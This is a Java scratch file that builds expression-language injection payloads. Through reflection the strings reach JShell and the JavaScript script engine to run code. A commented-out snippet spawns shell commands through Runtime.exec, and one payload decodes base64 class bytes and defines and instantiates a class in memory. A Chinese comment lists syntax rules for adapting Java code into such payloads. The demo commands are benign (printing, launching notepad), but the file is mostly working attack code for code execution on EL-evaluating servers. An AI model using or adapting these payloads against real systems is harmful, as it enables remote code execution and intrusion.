package com;

//import jdk.jshell.JShell;
//import jdk.jshell.SnippetEvent;

import java.util.List;

public class Test {

    public static void main(String[] args) {
        /**
         *                 ① 所有的数据类型修改为 var, 包括 byte[] bytes ( var bytes )
         *                 ② 必须使用全类名
         *                 ③  System.out.println() 需要修改为 print()
         *                 ④  try{...}catch(Exception e){...}  需要修改为 try{...}catch(err){...}
         *                 ⑤  双引号改为单引号
         *                 ⑥  Class.forName() 需要改为 java.lang.Class.forName(), String 需要改为 java.lang.String等
         *                 ⑦  去除类型强转
         *                 ⑧  不能用 sun.misc.BASE64Encoder，会抛异常  javax.script.ScriptException: ReferenceError: "sun" is not defined in <eval> at line number 1
         *                 ⑨  不能使用  for(Object obj : objects) 循环
         */

        String payload = "''.getClass().forName('jdk.jshell.JShell').getMethod('create').invoke(null).eval('System.out.println(\"111\");')";
        String payloadTemplate = "{" +
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                ".newInstance().getEngineByName(\"JavaScript\")" +
                ".eval(\"print('hello')\")" +
                "}";
//        new javax.el.ELProcessor().eval(payload);

//        String jshellPayload = "        String[] strs = new String[3];\n" +
//                "        if(java.io.File.separator.equals(\"/\")){\n" +
//                "            strs[0]=\"/bin/bash\";\n" +
//                "            strs[1]=\"-c\";\n" +
//                "            strs[2]=\"notepad\";\n" +
//                "        }else{\n" +
//                "            strs[0]=\"cmd\";\n" +
//                "            strs[1]=\"/C\";\n" +
//                "            strs[2]=\"notepad\";\n" +
//                "        }\n" +
//                "        java.lang.Runtime.getRuntime().exec(strs);";

        String classCode = "Y3Fx";
        Class clazz = java.lang.Runtime.class;
        String jshellPayload = "byte[] bytes = java.util.Base64.getDecoder().decode(\"" + classCode + "\");\n" +
                "java.lang.ClassLoader classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "   java.lang.Class clazz = classLoader.loadClass(\"" + clazz.getName() + "\");\n" +
                "   clazz.newInstance();\n" +
                "}catch(java.lang.Exception e){\n" +
//                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
//                    "   method.setAccessible(true);\n" +
//                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "   java.lang.Class clazz = java.lang.invoke.MethodHandles.lookup().defineClass(bytes);" +
                "   clazz.newInstance();\n" +
                "};";

//        JShell shell = JShell.builder().build();
//        List<SnippetEvent> events = shell.eval(jshellPayload);
//        events.stream().forEach(e -> System.out.println(e.toString()));


//        new javax.el.ELProcessor().eval("Runtime.getRuntime().exec(\"notepad\")");


    }
}
